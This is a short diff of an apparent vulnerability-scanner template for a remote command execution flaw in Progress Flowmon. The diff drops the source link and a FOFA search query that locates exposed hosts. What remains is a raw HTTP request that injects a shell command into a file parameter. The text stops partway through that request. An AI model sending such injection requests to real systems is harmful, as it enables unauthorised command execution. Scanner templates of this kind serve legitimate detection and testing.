@@ -3,12 +3,8 @@ info:
   name: ProgressFlowmon  远程命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/va4bsfnx90441w99'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: va4bsfnx90441w99
-    fofa: body="/css/themes/flowmon/"
 http:
 - raw:
   - 'GET /service.pdfs/confluence?lang=en&file=$(echo+''dudesite''>dudesite.txt) HTTP/1.1
